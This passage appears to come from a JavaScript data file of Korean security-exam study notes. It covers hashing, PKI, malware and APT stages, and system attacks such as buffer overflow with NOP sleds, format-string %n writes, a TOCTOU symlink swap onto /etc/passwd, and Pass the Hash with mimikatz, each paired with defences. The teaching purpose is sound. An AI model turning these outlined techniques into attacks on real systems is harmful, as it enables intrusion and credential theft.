    <tr><td><strong>SHA-384/512</strong></td><td>384/512bit</td><td>SHA-2 계열. 고보안 환경.</td></tr>
    <tr><td><strong>SHA-3</strong></td><td>224~512bit</td><td>Keccak 알고리즘. SHA-2와 완전히 다른 구조.</td></tr>
    <tr><td><strong>HAS-160</strong></td><td>160bit</td><td>국내 표준 해시 (KCDSA 서명에 사용).</td></tr>
  </tbody>
</table>

<h3>충돌 공격</h3>
<ul>
  <li><strong>MD5 충돌</strong>: 2004년 Wang 등이 이론 증명. 실용적 충돌 생성 가능.</li>
  <li><strong>SHA-1 충돌(SHAttered)</strong>: 2017년 Google 연구팀. 같은 SHA-1 해시값을 가진 두 PDF 파일 생성.</li>
  <li>충돌 저항성이 깨지면 디지털 서명 위조 가능 → 폐기</li>
</ul>

<h3>HMAC (Hash-based Message Authentication Code)</h3>
<p>비밀키 + 해시 함수 조합. <strong>무결성 + 인증</strong> 동시 제공. 기밀성은 제공하지 않음.</p>
<pre><code>HMAC(K, m) = H((K⊕opad) || H((K⊕ipad) || m))</code></pre>
<ul>
  <li>용도: API 요청 인증, TLS MAC, JWT HS256</li>
  <li>MAC만으로는 부인방지 불가 (키 공유 때문)</li>
</ul>

<h3>해시 공격 기법</h3>
<table>
  <thead><tr><th>공격</th><th>방법</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td>무차별 대입(Brute-force)</td><td>모든 가능한 입력 시도</td><td>긴 패스워드, 느린 해시 함수</td></tr>
    <tr><td>사전 공격(Dictionary)</td><td>자주 쓰이는 단어 목록 사용</td><td>복잡한 패스워드 정책</td></tr>
    <tr><td>Rainbow Table</td><td>사전계산된 해시 역조회 테이블</td><td>솔트(Salt) 사용</td></tr>
  </tbody>
</table>

<h3>솔트(Salt)와 패스워드 저장</h3>
<p><strong>솔트</strong>: 패스워드에 랜덤 값을 추가해 해시. 같은 패스워드도 다른 해시값 → Rainbow Table 무력화.</p>
<table>
  <thead><tr><th>방식</th><th>특징</th><th>권장 여부</th></tr></thead>
  <tbody>
    <tr><td>MD5(password)</td><td>빠름, Rainbow Table 취약</td><td>금지</td></tr>
    <tr><td>SHA-256(salt+password)</td><td>빠름 — 무차별 대입 취약</td><td>비권장</td></tr>
    <tr><td><strong>bcrypt</strong></td><td>작업 계수(cost factor)로 속도 조절</td><td>권장</td></tr>
    <tr><td><strong>PBKDF2</strong></td><td>반복 해시 + 솔트. NIST 권장.</td><td>권장</td></tr>
    <tr><td><strong>Argon2</strong></td><td>메모리 집약적. 2015년 Password Hashing Competition 우승.</td><td>권장</td></tr>
  </tbody>
</table>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'pki-signature',
    chapterLabel: 'PKI·디지털 서명',
    keywords: ['CA', 'RA', 'VA', 'PKI', 'X.509', 'CRL', 'OCSP', '디지털서명', '인증서', '공인인증서', '전자서명법', 'KISA'],
    content: `
<h3>디지털 서명 과정</h3>
<pre><code>서명(송신자):
  1. 메시지를 해시 함수로 요약 → 메시지 다이제스트(MD)
  2. MD를 송신자의 개인키로 암호화 → 디지털 서명

검증(수신자):
  1. 수신된 서명을 송신자의 공개키로 복호화 → MD'
  2. 수신된 메시지를 동일 해시 함수로 요약 → MD
  3. MD == MD' 이면 서명 유효</code></pre>

<h3>디지털 서명 제공 기능</h3>
<table>
  <thead><tr><th>제공하는 보안 기능</th><th>제공하지 않는 기능</th></tr></thead>
  <tbody>
    <tr>
      <td>무결성(Integrity), 인증(Authentication), 부인방지(Non-repudiation)</td>
      <td>기밀성(Confidentiality) — 별도 암호화 필요</td>
    </tr>
  </tbody>
</table>

<h3>PKI 구성요소</h3>
<table>
  <thead><tr><th>구성 요소</th><th>역할</th></tr></thead>
  <tbody>
    <tr><td><strong>CA (인증기관)</strong></td><td>인증서 발급·갱신·폐기. 신뢰의 근원.</td></tr>
    <tr><td><strong>RA (등록기관)</strong></td><td>사용자 신원 확인 후 CA에 인증서 발급 요청. CA와 사용자 사이 중개.</td></tr>
    <tr><td><strong>VA (검증기관)</strong></td><td>인증서 유효성 실시간 검증 (OCSP 응답 제공).</td></tr>
    <tr><td><strong>저장소(Repository)</strong></td><td>인증서·CRL 공개 저장. LDAP 디렉토리 방식.</td></tr>
  </tbody>
</table>

<h3>X.509 인증서 주요 필드</h3>
<table>
  <thead><tr><th>필드</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>버전(Version)</td><td>인증서 형식 버전 (v3 사용)</td></tr>
    <tr><td>일련번호(Serial Number)</td><td>CA 내 고유 번호</td></tr>
    <tr><td>서명 알고리즘</td><td>CA가 서명에 사용한 알고리즘</td></tr>
    <tr><td>발급자(Issuer)</td><td>인증서를 발급한 CA 정보</td></tr>
    <tr><td>유효기간(Validity)</td><td>NotBefore ~ NotAfter</td></tr>
    <tr><td>주체(Subject)</td><td>인증서 소유자 정보</td></tr>
    <tr><td>공개키 정보</td><td>소유자의 공개키 + 알고리즘</td></tr>
    <tr><td>확장(Extensions)</td><td>SAN, Key Usage, CRL 배포점 등</td></tr>
    <tr><td>CA 서명</td><td>CA 개인키로 서명한 값</td></tr>
  </tbody>
</table>

<h3>CRL vs OCSP 비교</h3>
<table>
  <thead><tr><th>구분</th><th>CRL</th><th>OCSP</th></tr></thead>
  <tbody>
    <tr><td>방식</td><td>폐기 인증서 목록 다운로드</td><td>실시간 상태 조회</td></tr>
    <tr><td>최신성</td><td>주기적 갱신 (다소 지연)</td><td>실시간</td></tr>
    <tr><td>크기</td><td>목록이 커질 수 있음</td><td>단건 응답</td></tr>
    <tr><td>프라이버시</td><td>CA에 조회 안함</td><td>CA가 조회 내역 파악 가능</td></tr>
    <tr><td>포트</td><td>HTTP 80</td><td>HTTP 80/443</td></tr>
  </tbody>
</table>
<p><strong>OCSP Stapling</strong>: 서버가 OCSP 응답을 미리 캐시해 TLS 핸드셰이크 시 클라이언트에 제공 → 성능 향상, 프라이버시 보호.</p>

<h3>인증서 검증 체인</h3>
<pre><code>Root CA (자체 서명, 브라우저/OS 내장)
  ↓ 서명
중간 CA (Intermediate CA)
  ↓ 서명
사용자(서버) 인증서</code></pre>
<p>신뢰 체인(Chain of Trust): Root CA를 신뢰하면 중간 CA와 최종 인증서도 신뢰.</p>

<h3>국내 PKI 체계</h3>
<ul>
  <li>최상위 인증기관: <strong>KISA (한국인터넷진흥원)</strong></li>
  <li>공인인증기관 5개: 금융결제원, KOSCOM, 한국정보인증, 이니텍, 한국전자인증</li>
  <li><strong>2020년 전자서명법 개정</strong>: 공인인증서(구 공인인증기관) 독점 지위 폐지. 사설 인증서와 동등 지위.</li>
</ul>
    `,
  },

  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'malware',
    chapterLabel: '악성코드·APT',
    keywords: ['바이러스', '웜', '트로이목마', '랜섬웨어', '루트킷', '스파이웨어', '봇넷', '키로거', '백도어', 'APT', '드라이브바이다운로드', '워터링홀', '스피어피싱', '공급망'],
    content: `

<h3>악성코드 유형 분류</h3>
<table>
  <thead><tr><th>유형</th><th>자기복제</th><th>숙주 필요</th><th>주요 특징</th></tr></thead>
  <tbody>
    <tr><td><strong>바이러스(Virus)</strong></td><td>O</td><td>O</td><td>다른 프로그램·파일에 기생. 실행 시 활성화. 부팅 바이러스(MBR 감염), 파일 바이러스(실행파일 감염), 매크로 바이러스.</td></tr>
    <tr><td><strong>웜(Worm)</strong></td><td>O</td><td>X</td><td>네트워크로 자율 전파. 독립 프로세스. 대역폭 소모. Morris Worm(1988), Code Red, Slammer.</td></tr>
    <tr><td><strong>트로이목마(Trojan)</strong></td><td>X</td><td>X</td><td>유용한 프로그램으로 위장. 실행 시 악성 기능 수행. RAT(원격 접근 도구) 포함.</td></tr>
    <tr><td><strong>랜섬웨어</strong></td><td>△</td><td>X</td><td>파일 암호화 후 복구 대가로 암호화폐 요구. WannaCry(2017), NotPetya, LockBit.</td></tr>
    <tr><td><strong>루트킷(Rootkit)</strong></td><td>X</td><td>X</td><td>OS 커널 수준 은폐. 탐지 극히 어려움. 프로세스·파일·네트워크 연결 숨김.</td></tr>
    <tr><td><strong>스파이웨어</strong></td><td>X</td><td>X</td><td>사용자 활동·정보 몰래 수집·전송. 키로거 포함.</td></tr>
    <tr><td><strong>애드웨어</strong></td><td>X</td><td>X</td><td>광고 강제 표시. 사용자 동의 없는 설치. 스파이웨어 성격 혼재.</td></tr>
    <tr><td><strong>키로거(Keylogger)</strong></td><td>X</td><td>X</td><td>키보드 입력 가로채기. 하드웨어형(USB)·소프트웨어형.</td></tr>
    <tr><td><strong>봇(Bot)/봇넷</strong></td><td>O</td><td>X</td><td>C&C(Command & Control) 서버의 명령으로 동작. DDoS, 스팸 발송, 정보 탈취.</td></tr>
    <tr><td><strong>백도어(Backdoor)</strong></td><td>X</td><td>X</td><td>인증 우회 비밀 접근 경로. 공격자가 재접근용으로 설치.</td></tr>
    <tr><td><strong>다운로더</strong></td><td>X</td><td>X</td><td>다른 악성코드를 다운로드·실행. 드로퍼(Dropper)와 유사.</td></tr>
    <tr><td><strong>익스플로잇(Exploit)</strong></td><td>X</td><td>X</td><td>취약점을 악용해 권한 획득. 제로데이 익스플로잇: 패치 전 취약점.</td></tr>
  </tbody>
</table>

<h3>바이러스 감염 방식</h3>
<ul>
  <li><strong>부트 바이러스</strong>: MBR(마스터 부트 레코드) 감염. 부팅 시 실행.</li>
  <li><strong>파일 바이러스</strong>: .exe, .com 등 실행파일에 코드 삽입.</li>
  <li><strong>매크로 바이러스</strong>: Office 문서 매크로 기능 악용. Melissa, Concept.</li>
  <li><strong>스크립트 바이러스</strong>: JavaScript, VBScript 활용.</li>
  <li><strong>다형성(Polymorphic) 바이러스</strong>: 복제 시마다 코드 변형 → 시그니처 탐지 회피.</li>
  <li><strong>은폐형(Stealth) 바이러스</strong>: 감염 사실 숨김. OS 인터럽트 후킹.</li>
</ul>

<h3>악성코드 탐지 기법</h3>
<table>
  <thead><tr><th>기법</th><th>원리</th><th>장점</th><th>단점</th></tr></thead>
  <tbody>
    <tr><td><strong>시그니처 기반</strong></td><td>알려진 패턴 DB와 비교</td><td>정확도 높음, 속도 빠름</td><td>신종·변종 탐지 불가</td></tr>
    <tr><td><strong>행위 기반(휴리스틱)</strong></td><td>의심 행동 패턴 탐지</td><td>신종 탐지 가능</td><td>오탐률 높음</td></tr>
    <tr><td><strong>무결성 검사</strong></td><td>파일 해시값 비교</td><td>변조 정확히 탐지</td><td>초기 해시 DB 필요</td></tr>
    <tr><td><strong>샌드박스</strong></td><td>격리 환경 실행 관찰</td><td>행위 직접 확인</td><td>느림, 샌드박스 탐지 우회 가능</td></tr>
    <tr><td><strong>평판 기반</strong></td><td>클라우드 집단 지성</td><td>빠른 신종 대응</td><td>인터넷 연결 필요</td></tr>
  </tbody>
</table>

<h3>APT (지능형 지속 위협, Advanced Persistent Threat)</h3>
<p>특정 목표를 대상으로 <strong>장기간(수개월~수년)</strong>에 걸쳐 은밀하게 진행하는 고도화된 사이버 공격.</p>

<h4>APT 공격 단계</h4>
<ol>
  <li><strong>정찰(Reconnaissance)</strong>: 목표 정보 수집 (OSINT, 소셜미디어, 공개 정보)</li>
  <li><strong>무기화(Weaponization)</strong>: 익스플로잇 + 악성코드 결합 (예: 악성 문서 파일)</li>
  <li><strong>전달(Delivery)</strong>: 스피어피싱 이메일, 드라이브바이다운로드, USB</li>
  <li><strong>취약점 실행(Exploitation)</strong>: 제로데이 또는 알려진 취약점 실행</li>
  <li><strong>설치(Installation)</strong>: 백도어·RAT 설치. 지속성 확보.</li>
  <li><strong>명령 및 제어(C2, C&C)</strong>: 공격자 서버와 통신. 명령 수신.</li>
  <li><strong>목적 달성(Actions on Objectives)</strong>: 데이터 탈취, 파괴, 랜섬웨어 배포</li>
</ol>

<h3>주요 공격 기법</h3>
<ul>
  <li><strong>드라이브 바이 다운로드(Drive-by Download)</strong>: 악성 웹페이지 방문만으로 자동 다운로드·설치. 브라우저/플러그인 취약점 악용.</li>
  <li><strong>워터링홀(Watering Hole)</strong>: 표적이 자주 방문하는 정상 사이트 해킹 → 악성코드 삽입. 방문자 자동 감염.</li>
  <li><strong>스피어피싱(Spear Phishing)</strong>: 특정 대상 맞춤형 피싱 이메일. 실제 관련자 사칭. 일반 피싱보다 성공률 높음.</li>
  <li><strong>공급망 공격(Supply Chain Attack)</strong>: 소프트웨어 공급망을 통해 신뢰된 업데이트에 악성코드 삽입. SolarWinds 사례.</li>
  <li><strong>Living off the Land(LotL)</strong>: 시스템 정상 도구(PowerShell, WMI) 악용 → 탐지 회피.</li>
  <li><strong>필리싱(Vishing/Smishing)</strong>: 전화/SMS를 이용한 피싱.</li>
</ul>

<h3>랜섬웨어 특징 및 대응</h3>
<ul>
  <li>파일 암호화 후 복구 대가로 암호화폐 요구. WannaCry(2017, EternalBlue 취약점 악용), NotPetya, LockBit.</li>
  <li><strong>3-2-1 백업 규칙</strong>: 3개 복사본 / 2개 다른 미디어 / 1개 오프사이트</li>
  <li>OS·소프트웨어 최신 패치 유지</li>
  <li>네트워크 분리(Segmentation): 감염 확산 방지</li>
  <li>EDR(Endpoint Detection and Response) 도입</li>
</ul>

<h3>악성코드 탐지 기법</h3>
<table>
  <thead><tr><th>기법</th><th>원리</th><th>장점</th><th>단점</th></tr></thead>
  <tbody>
    <tr><td><strong>시그니처 기반</strong></td><td>알려진 패턴 DB와 비교</td><td>정확도 높음, 빠름</td><td>신종·변종 탐지 불가</td></tr>
    <tr><td><strong>행위 기반(휴리스틱)</strong></td><td>의심 행동 패턴 탐지</td><td>신종 탐지 가능</td><td>오탐률 높음</td></tr>
    <tr><td><strong>무결성 검사</strong></td><td>파일 해시값 비교</td><td>변조 정확히 탐지</td><td>초기 해시 DB 필요</td></tr>
    <tr><td><strong>샌드박스</strong></td><td>격리 환경 실행 관찰</td><td>행위 직접 확인</td><td>느림, 우회 가능</td></tr>
    <tr><td><strong>평판 기반</strong></td><td>클라우드 집단 지성</td><td>빠른 신종 대응</td><td>인터넷 연결 필요</td></tr>
  </tbody>
</table>
    `,
  },
  {
    subject: 'system',
    subjectLabel: '시스템보안',
    chapter: 'system-attack',
    chapterLabel: '시스템 공격 기법',
    keywords: ['버퍼오버플로', '포맷스트링', '레이스컨디션', 'TOCTOU', '권한상승', '루트킷', '패스워드크래킹', 'Pass the Hash', 'NOP sled', '스택'],
    content: `
<h3>버퍼 오버플로 (Buffer Overflow)</h3>
<p>입력 데이터가 버퍼 크기를 초과해 인접 메모리를 덮어쓰는 공격. 스택의 리턴 주소를 공격자 코드로 덮어씁니다.</p>
<table>
  <thead><tr><th>구분</th><th>스택 기반</th><th>힙 기반</th></tr></thead>
  <tbody>
    <tr><td>대상</td><td>스택 상의 지역변수</td><td>동적 할당 메모리</td></tr>
    <tr><td>목표</td><td>리턴 주소 덮어쓰기</td><td>함수 포인터, vtable 덮어쓰기</td></tr>
    <tr><td>난이도</td><td>비교적 쉬움</td><td>어려움</td></tr>
  </tbody>
</table>

<h4>NOP Sled</h4>
<p>NOP(No Operation) 명령어(0x90)를 연속 배치해 셸코드 앞에 슬라이드 영역 생성. 정확한 리턴 주소 몰라도 NOP 영역 어딘가에 점프하면 셸코드 실행 가능.</p>

<h4>버퍼 오버플로 대응 기법</h4>
<table>
  <thead><tr><th>대응 기법</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>ASLR</strong> (Address Space Layout Randomization)</td><td>스택·힙·라이브러리 주소 무작위화 → 리턴 주소 예측 방해</td></tr>
    <tr><td><strong>DEP/NX</strong> (Data Execution Prevention)</td><td>스택·힙에서 코드 실행 금지</td></tr>
    <tr><td><strong>스택 카나리(Stack Canary)</strong></td><td>리턴 주소 앞에 카나리 값 배치. 리턴 전 카나리 변조 여부 확인.</td></tr>
    <tr><td><strong>SafeSEH</strong></td><td>SEH(구조적 예외 처리) 핸들러 포인터 검증 (Windows)</td></tr>
  </tbody>
</table>

<h3>포맷 스트링 공격 (Format String Attack)</h3>
<p>printf() 등 포맷 함수에 사용자 입력을 직접 포맷 문자열로 전달할 때 발생.</p>
<pre><code>취약 코드: printf(user_input);       // 위험
안전 코드: printf("%s", user_input); // 안전

%x : 스택 메모리 내용 출력 (정보 유출)
%n : 현재까지 출력한 바이트 수를 메모리에 쓰기 (임의 쓰기 가능)</code></pre>

<h3>레이스 컨디션 / TOCTOU</h3>
<p><strong>레이스 컨디션(Race Condition)</strong>: 두 프로세스가 공유 자원에 동시 접근해 결과가 실행 순서에 따라 달라지는 취약점.</p>
<p><strong>TOCTOU (Time-of-Check-to-Time-of-Use)</strong>: 권한 확인 시점(TOC)과 실제 사용 시점(TOU) 사이에 공격자가 파일 등 자원을 교체하는 공격.</p>
<pre><code>1. 프로그램이 /tmp/safe_file 권한 확인 (TOC)
2. 공격자가 /tmp/safe_file을 /etc/passwd로 심볼릭 링크 교체
3. 프로그램이 /tmp/safe_file에 쓰기 (TOU) → /etc/passwd 수정됨</code></pre>

<h3>권한 상승 기법</h3>
<ul>
  <li><strong>SetUID 악용</strong>: SUID 설정된 프로그램의 취약점을 이용해 root 권한 획득</li>
  <li><strong>커널 취약점 공격</strong>: dirty COW, ptrace 등 커널 버그 악용</li>
  <li><strong>sudo 설정 오류</strong>: sudoers 잘못된 설정으로 권한 상승</li>
  <li><strong>PATH 변조</strong>: 환경변수 PATH에 악성 디렉토리 삽입</li>
</ul>

<h3>루트킷 (Rootkit)</h3>
<p>시스템에 지속적으로 은닉하며 관리자 수준 접근을 유지하는 악성 소프트웨어.</p>
<table>
  <thead><tr><th>유형</th><th>동작 방식</th></tr></thead>
  <tbody>
    <tr><td>커널 레벨 루트킷</td><td>커널 모듈로 로드. 시스템 콜 테이블 후킹. 탐지 극히 어려움.</td></tr>
    <tr><td>사용자 레벨 루트킷</td><td>ls, ps 등 시스템 명령어 교체. 상대적으로 탐지 쉬움.</td></tr>
    <tr><td>부트킷</td><td>MBR/UEFI 감염. OS 로드 전 실행.</td></tr>
    <tr><td>하이퍼바이저 루트킷</td><td>가상화 레이어 활용. OS 아래에서 동작.</td></tr>
  </tbody>
</table>

<h3>패스워드 크래킹</h3>
<table>
  <thead><tr><th>기법</th><th>설명</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td>무차별 대입(Brute-force)</td><td>모든 가능한 조합 시도</td><td>계정 잠금, 긴 패스워드</td></tr>
    <tr><td>사전 공격(Dictionary)</td><td>자주 쓰이는 단어 목록</td><td>복잡한 패스워드 정책</td></tr>
    <tr><td>Rainbow Table</td><td>사전계산된 해시 역조회</td><td>솔트(Salt) 사용</td></tr>
    <tr><td>하이브리드 공격</td><td>사전 단어 + 숫자·특수문자 조합</td><td>복잡한 패스워드</td></tr>
  </tbody>
</table>

<h3>Pass the Hash (PtH)</h3>
<p>Windows NTLM 인증에서 실제 패스워드 없이 <strong>NTLM 해시값만으로 인증</strong>하는 공격.</p>
<ul>
  <li>공격 도구: mimikatz, impacket</li>
  <li>대응: Kerberos 인증 사용, Protected Users 그룹 활용, 관리자 계정 최소화, Credential Guard</li>
</ul>

<h3>대응 방안 종합</h3>
<table>
  <thead><tr><th>공격 유형</th><th>주요 대응</th></tr></thead>
  <tbody>
    <tr><td>버퍼 오버플로</td><td>ASLR, DEP, 스택 카나리, 안전한 함수 사용(strncpy, snprintf)</td></tr>
    <tr><td>포맷 스트링</td><td>포맷 문자열에 사용자 입력 직접 사용 금지</td></tr>
    <tr><td>TOCTOU</td><td>파일 디스크립터 사용(open 후 fd로만 처리), 임시파일 안전한 생성(mkstemp)</td></tr>
    <tr><td>권한 상승</td><td>최소권한 원칙, 불필요한 SUID 파일 제거, 정기 패치</td></tr>
    <tr><td>루트킷</td><td>무결성 검사 도구(Tripwire), 신뢰 부트(Secure Boot), EDR</td></tr>
    <tr><td>Pass the Hash</td><td>Kerberos 강제, Credential Guard, 관리자 계정 분리</td></tr>
  </tbody>
</table>
    `,
  },

  // ===== 네트워크보안 =====
  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'network-basics',
    chapterLabel: '네트워크 기초',
    keywords: ['OSI', 'TCP/IP', '3-way handshake', '4-way handshake', 'ARP', 'DHCP', 'DNS', 'NAT', 'CIDR', 'IPv4', 'IPv6', 'TTL', 'MTU', 'TCP', 'UDP', '포트'],
    content: `

<h3>OSI 7계층</h3>
<table>
  <thead><tr><th>계층</th><th>이름</th><th>주요 프로토콜·장비</th><th>데이터 단위</th><th>주요 공격</th></tr></thead>
  <tbody>
    <tr><td>7</td><td>응용(Application)</td><td>HTTP, FTP, SMTP, DNS, SNMP, Telnet</td><td>메시지</td><td>SQL Injection, XSS</td></tr>
    <tr><td>6</td><td>표현(Presentation)</td><td>SSL/TLS, JPEG, MPEG, ASCII</td><td>메시지</td><td>SSL Stripping</td></tr>
    <tr><td>5</td><td>세션(Session)</td><td>NetBIOS, RPC, SMB</td><td>메시지</td><td>세션 하이재킹</td></tr>
    <tr><td>4</td><td>전송(Transport)</td><td>TCP, UDP</td><td>세그먼트</td><td>SYN Flooding, 포트 스캔</td></tr>
    <tr><td>3</td><td>네트워크(Network)</td><td>IP, ICMP, OSPF, BGP, 라우터</td><td>패킷</td><td>IP Spoofing, Smurf</td></tr>
    <tr><td>2</td><td>데이터링크(Data Link)</td><td>Ethernet, MAC, ARP, PPP, 스위치</td><td>프레임</td><td>ARP Spoofing, MAC Flooding</td></tr>
    <tr><td>1</td><td>물리(Physical)</td><td>Hub, 케이블, 리피터, NIC</td><td>비트</td><td>도청(Eavesdropping)</td></tr>
  </tbody>
</table>

<h3>TCP/IP 4계층 (DoD 모델)</h3>
<table>
  <thead><tr><th>TCP/IP 계층</th><th>대응 OSI 계층</th><th>프로토콜</th></tr></thead>
  <tbody>
    <tr><td>응용(Application)</td><td>5~7계층</td><td>HTTP, FTP, SMTP, DNS, SSH, Telnet</td></tr>
    <tr><td>전송(Transport)</td><td>4계층</td><td>TCP, UDP</td></tr>
    <tr><td>인터넷(Internet)</td><td>3계층</td><td>IP, ICMP, ARP, RARP</td></tr>
    <tr><td>네트워크 액세스(Network Access)</td><td>1~2계층</td><td>Ethernet, Wi-Fi, PPP</td></tr>
  </tbody>
</table>

<h3>TCP vs UDP 비교</h3>
<table>
  <thead><tr><th>구분</th><th>TCP</th><th>UDP</th></tr></thead>
  <tbody>
    <tr><td>연결 방식</td><td>연결 지향 (3-way handshake)</td><td>비연결(Connectionless)</td></tr>
    <tr><td>신뢰성</td><td>높음 (순서 보장, 재전송, 흐름·혼잡 제어)</td><td>없음</td></tr>
    <tr><td>속도</td><td>상대적으로 느림</td><td>빠름</td></tr>
    <tr><td>헤더 크기</td><td>20~60 byte</td><td>8 byte</td></tr>
    <tr><td>주요 용도</td><td>HTTP(S), FTP, SMTP, SSH, Telnet</td><td>DNS, DHCP, VoIP, 스트리밍, SNMP</td></tr>
  </tbody>
</table>

<h3>TCP 연결 관리</h3>
<h4>3-way Handshake (연결 수립)</h4>
<pre><code>클라이언트 --[SYN, seq=x]-----------> 서버
클라이언트 &lt;--[SYN+ACK, seq=y, ack=x+1]- 서버
클라이언트 --[ACK, ack=y+1]----------> 서버</code></pre>

<h4>4-way Handshake (연결 종료)</h4>
<pre><code>클라이언트 --[FIN]---> 서버
클라이언트 &lt;--[ACK]-- 서버
클라이언트 &lt;--[FIN]-- 서버
클라이언트 --[ACK]---> 서버  (TIME_WAIT 상태 진입)</code></pre>

<h4>TCP 주요 플래그</h4>
<table>
  <thead><tr><th>플래그</th><th>의미</th></tr></thead>
  <tbody>
    <tr><td>SYN</td><td>연결 요청</td></tr>
    <tr><td>ACK</td><td>수신 확인</td></tr>
    <tr><td>FIN</td><td>연결 종료 요청</td></tr>
    <tr><td>RST</td><td>연결 강제 초기화</td></tr>
    <tr><td>PSH</td><td>즉시 전달 요청</td></tr>
    <tr><td>URG</td><td>긴급 데이터</td></tr>
  </tbody>
</table>

<h3>주요 포트 번호</h3>
<table>
  <thead><tr><th>프로토콜</th><th>포트</th><th>전송층</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td>FTP (데이터)</td><td>20</td><td>TCP</td><td>파일 전송 데이터</td></tr>
    <tr><td>FTP (제어)</td><td>21</td><td>TCP</td><td>파일 전송 제어</td></tr>
    <tr><td>SSH</td><td>22</td><td>TCP</td><td>보안 원격 접속·터널링</td></tr>
    <tr><td>Telnet</td><td>23</td><td>TCP</td><td>원격 접속 (평문, 보안 취약)</td></tr>
    <tr><td>SMTP</td><td>25</td><td>TCP</td><td>메일 송신</td></tr>
    <tr><td>DNS</td><td>53</td><td>UDP/TCP</td><td>도메인 이름 해석</td></tr>
    <tr><td>DHCP</td><td>67/68</td><td>UDP</td><td>IP 자동 할당 (서버/클라이언트)</td></tr>
    <tr><td>TFTP</td><td>69</td><td>UDP</td><td>단순 파일 전송</td></tr>
    <tr><td>HTTP</td><td>80</td><td>TCP</td><td>웹</td></tr>
    <tr><td>POP3</td><td>110</td><td>TCP</td><td>메일 수신 (서버 삭제)</td></tr>
    <tr><td>IMAP</td><td>143</td><td>TCP</td><td>메일 수신 (서버 유지·동기화)</td></tr>
    <tr><td>SNMP</td><td>161/162</td><td>UDP</td><td>네트워크 장비 관리/트랩</td></tr>
    <tr><td>LDAP</td><td>389</td><td>TCP/UDP</td><td>디렉토리 서비스</td></tr>
    <tr><td>HTTPS</td><td>443</td><td>TCP</td><td>보안 웹(TLS)</td></tr>
    <tr><td>SMTPS</td><td>465/587</td><td>TCP</td><td>보안 메일 송신</td></tr>
    <tr><td>SMB</td><td>445</td><td>TCP</td><td>파일 공유 (Windows)</td></tr>
    <tr><td>LDAPS</td><td>636</td><td>TCP</td><td>보안 LDAP(TLS)</td></tr>
    <tr><td>RDP</td><td>3389</td><td>TCP</td><td>원격 데스크톱</td></tr>
  </tbody>
</table>

<h3>주요 프로토콜 동작 원리</h3>

<h4>ARP (Address Resolution Protocol)</h4>
<p>IP 주소 → MAC 주소 변환. 브로드캐스트 요청 후 유니캐스트 응답. 결과는 ARP 캐시에 저장.</p>
<ul>
  <li><strong>RARP</strong>: MAC → IP 역변환. DHCP 이전 사용.</li>
  <li><strong>Proxy ARP</strong>: 라우터가 다른 서브넷 대신 ARP 응답.</li>
  <li><strong>Gratuitous ARP</strong>: 자신의 IP-MAC을 브로드캐스트로 알림 (중복 IP 탐지·캐시 갱신).</li>
</ul>

<h4>DHCP 동작 순서 (DORA)</h4>
<p>IP 주소·서브넷 마스크·게이트웨이·DNS 서버를 자동 할당.</p>
<ol>
  <li><strong>Discover</strong>: 클라이언트가 브로드캐스트로 DHCP 서버 탐색</li>
  <li><strong>Offer</strong>: DHCP 서버가 사용 가능한 IP 주소 제안</li>
  <li><strong>Request</strong>: 클라이언트가 특정 서버의 제안 수락 요청</li>
  <li><strong>ACK</strong>: DHCP 서버가 임대 확정 및 정보 전달</li>
</ol>

<h4>DNS 동작 원리</h4>
<p>도메인 이름 → IP 주소 변환. 계층 구조: 루트(.) → TLD(.com) → 2차 도메인(example) → 호스트(www).</p>
<table>
  <thead><tr><th>레코드 유형</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td>A</td><td>도메인 → IPv4 주소</td></tr>
    <tr><td>AAAA</td><td>도메인 → IPv6 주소</td></tr>
    <tr><td>MX</td><td>메일 서버 지정</td></tr>
    <tr><td>CNAME</td><td>별칭 도메인 → 정식 도메인</td></tr>
    <tr><td>NS</td><td>권한 네임서버</td></tr>
    <tr><td>PTR</td><td>IP → 도메인 역방향</td></tr>
    <tr><td>TXT</td><td>임의 텍스트 (SPF, DKIM 등)</td></tr>
    <tr><td>SOA</td><td>권한 시작 정보</td></tr>
  </tbody>
</table>

<h3>NAT (Network Address Translation)</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td>Static NAT</td><td>사설 IP 1:1 공인 IP 매핑 (고정)</td><td>서버 공개</td></tr>
    <tr><td>Dynamic NAT</td><td>사설 IP → 공인 IP 풀에서 동적 할당</td><td>소규모 기업</td></tr>
    <tr><td>PAT (NAPT, IP Masquerading)</td><td>여러 사설 IP → 공인 IP 1개 + 포트로 구분</td><td>가정·소호 환경</td></tr>
  </tbody>
</table>

<h3>IPv4 vs IPv6 비교</h3>
<table>
  <thead><tr><th>항목</th><th>IPv4</th><th>IPv6</th></tr></thead>
  <tbody>
    <tr><td>주소 길이</td><td>32bit (약 43억 개)</td><td>128bit (사실상 무제한)</td></tr>
    <tr><td>표기</td><td>10진수 점 표기 (192.168.0.1)</td><td>16진수 콜론 표기 (2001:db8::1)</td></tr>
    <tr><td>헤더</td><td>가변 (20~60 byte)</td><td>고정 40 byte + 확장 헤더</td></tr>
    <tr><td>IPSec</td><td>선택적</td><td>기본 내장</td></tr>
    <tr><td>브로드캐스트</td><td>있음</td><td>없음 (멀티캐스트·애니캐스트 사용)</td></tr>
    <tr><td>자동 설정</td><td>DHCP 필요</td><td>SLAAC (상태 비저장 자동 설정)</td></tr>
    <tr><td>체크섬</td><td>헤더에 포함</td><td>제거 (상위 계층 담당)</td></tr>
    <tr><td>루프백</td><td>127.0.0.1</td><td>::1</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'protocol-security',
    chapterLabel: '프로토콜 취약점',
    keywords: ['ARP Spoofing', 'ARP 스푸핑', 'ICMP', 'DNS 스푸핑', 'DNS Cache Poisoning', 'DHCP Starvation', 'BGP', 'OSPF', 'IP Spoofing', '세션 하이재킹', 'TCP Sequence', 'MITM', 'Smurf'],
    content: `

<h3>ARP 취약점</h3>
<p>ARP는 인증 메커니즘이 없어 위조 응답을 그대로 수용한다. 이를 악용하면 네트워크 트래픽을 가로챌 수 있다.</p>

